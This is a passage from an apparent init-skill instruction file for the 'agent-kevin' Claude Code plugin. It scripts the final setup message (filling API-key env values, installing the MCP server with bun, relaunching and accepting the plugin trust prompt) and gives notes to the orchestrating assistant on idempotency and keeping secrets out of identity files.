For the operating-manual row:
- No collision: `<MANUAL_PATH>` = `CLAUDE.md`
- Collision detected (pre-existing CLAUDE.md): `<MANUAL_PATH>` = `CLAUDE.local.md` — also append a callout line:
  > ℹ️ Existing `CLAUDE.md` detected at home — Kevin's operating manual was written to `CLAUDE.local.md` alongside it. Both files load; your prior CLAUDE.md is untouched.

Blank line, then the **Next** heading (same style as Ready), then the relaunch prose. **Important: the user must exit and relaunch** so the new `.claude/settings.json` is picked up by Claude Code:

> 🚀 **Next**
>
> **Fill the env values.** Open `<HOME_DIR>/.claude/settings.local.json` in your editor. The `env` block holds every secret Kevin's optional packs consume — they're scaffolded as empty strings on purpose so they never pass through a chat transcript. Fill the ones you need:
>
> - `PERPLEXITY_API_KEY` — for `perplexity_search` (sign up at https://perplexity.ai/settings/api)
> - `SERPAPI_KEY` — for SEO pack's `serpapi_search` (https://serpapi.com)
> - `OPENPAGERANK_API_KEY` — for SEO pack's `open_page_rank` (https://openpagerank.com)
> - `GSC_SITE_URL` — your Search Console property (set this before running `mcp__plugin_agent-kevin_kevin__google_auth` for GSC/PageSpeed)
>
> Leave blanks for anything you don't need. Tools whose key is empty stay loaded but return "missing env var" if called — fill the value any time later and the next session picks it up.
>
> **One-time MCP-server install.** Kevin's MCP server runs from the plugin directory and needs its node_modules. From a separate terminal (or after `/exit`), run:
>
> ```bash
> cd <PLUGIN_PATH>/mcp-server && bun install
> ```
>
> (where `<PLUGIN_PATH>` is the absolute path of the plugin — same as `${CLAUDE_PLUGIN_ROOT}` during this init.) This pulls Chromium for Playwright (~150MB) and is required even if you installed via `/plugin marketplace add`. Skip if you've already done it for another Kevin home.
>
> **Then relaunch.** The plugin registration in `.claude/settings.json` only takes effect on a fresh session. Exit now (`/exit` or Ctrl+D) and relaunch:
>
> ```bash
> cd <HOME_DIR>
> claude
> ```
>
> **Watch for a marketplace trust prompt.** On first relaunch, Claude Code asks "this project wants to register a marketplace and enable a plugin — trust it?" **Accept it.** If you dismiss/miss the prompt, the plugin won't load and the SessionStart banner won't appear — recover by running:
>
> ```
> /plugin marketplace add <PLUGIN_DIR>
> /plugin install agent-kevin@agentlayer
> ```
>
> (where `<PLUGIN_DIR>` is the absolute path of the cloned plugin — same path as `${CLAUDE_PLUGIN_ROOT}` during this init session.)
>
> Once the plugin is loaded, try:
>
> - `/agent-kevin:configure-skills` — configure skill packs (SEO, Browser) or author a custom skill
> - `/agent-kevin:create-project` — start your first project
> - `/agent-kevin:morning-briefing` — see what Kevin knows about you
> - `mcp__plugin_agent-kevin_kevin__ping` — health check the MCP server
>
> Open `<HOME_DIR>` in Obsidian to view/edit your wiki.

---

## Notes for you (the orchestrating Claude)

- **Idempotent.** Step 0 catches re-runs.
- **No secrets in identity files.** API keys go to `<HOME>/.claude/settings.local.json` via the configure-skills flow (Step 8 inline or `/agent-kevin:configure-skills` later), never to CLAUDE/SOUL/IDENTITY/USER.
- **CLAUDE.md (or CLAUDE.local.md) is never customised.** Copy verbatim. SOUL.md adjusts tone. USER.md gets the user's headline. IDENTITY.md adjusts role.
- **Stage before write.** Build all content through Steps 2–6. Only Step 7 writes to disk.
- **Step 8 delegates, doesn't duplicate.** When the user opts to configure skills inline, *read* `${CLAUDE_PLUGIN_ROOT}/skills/configure-skills/SKILL.md` and follow its Section A walks. Don't reimplement key-prompts/MCP-writes/permission-grants here — keep configure-skills as the single source of truth so standalone use and inline use behave identically.
- **No `.claude/skills/` creation in Step 7.** That directory is only needed for custom-authored skills (configure-skills Section B). Sandbox often denies it; let configure-skills create it lazily.
- **URL fetches are best-effort.** Don't loop retries; note failures and move on. Don't ask the user to confirm the synthesised facts — let them edit later.
